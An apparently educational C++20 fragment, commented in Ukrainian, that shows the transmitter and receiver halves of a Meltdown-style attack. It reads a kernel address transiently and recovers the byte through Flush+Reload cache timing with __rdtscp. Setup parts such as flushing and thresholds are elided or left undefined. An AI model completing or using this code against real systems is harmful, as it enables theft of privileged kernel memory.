/* У C++20 використовуємо std::array із вирівнюванням по сторінці,
   а розіменування адреси ядра — через reinterpret_cast. */
#include <array>
#include <cstdint>
#include <x86intrin.h>

static alignas(4096) std::array<uint8_t, 256 * 4096> probe;

/* … перед пострілом усі 256 рядків витиснуто з кешу clflush … */

// Передавач: два рядки, обидва будуть скасовані
auto value = *reinterpret_cast<volatile uint8_t*>(kernel_addr);
auto tmp   = probe[value * 4096];

// Приймач: шукаємо рядок із мінімальним часом доступу
unsigned aux = 0;
for (std::size_t i = 0; i < 256; ++i) {
    auto volatile* p = &probe[i * 4096];
    uint64_t t0 = __rdtscp(&aux);
    (void)*p;
    uint64_t dt = __rdtscp(&aux) - t0;
    if (dt < THRESHOLD) {
        secret = static_cast<uint8_t>(i);
    }
}
